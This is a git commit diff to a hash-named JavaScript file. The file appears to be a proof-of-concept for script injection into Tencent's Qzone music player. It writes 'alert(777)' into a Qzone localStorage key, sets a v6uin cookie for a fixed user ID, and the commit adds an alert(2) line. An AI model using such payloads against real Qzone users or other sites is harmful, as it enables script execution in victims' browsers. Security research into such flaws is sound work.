04049851995ea5c2b7853450484445fce3231a65
Camaro <cstcamaro@gmail.com>
2019-12-13 13:43:33 +0800

    Update c492f5a86f02611c8398721e8e898303.js

--- c492f5a86f02611c8398721e8e898303.js
+++ c492f5a86f02611c8398721e8e898303.js
@@ -2,3 +2,4 @@ const UIN = '2461993793'
 localStorage.setItem("qzonev6musicstate1", ',,,199999999999,xxx');
 localStorage.setItem("qzonev6music" + UIN, 'alert(777)');
 document.cookie = 'v6uin=' + UIN;
+alert(2);
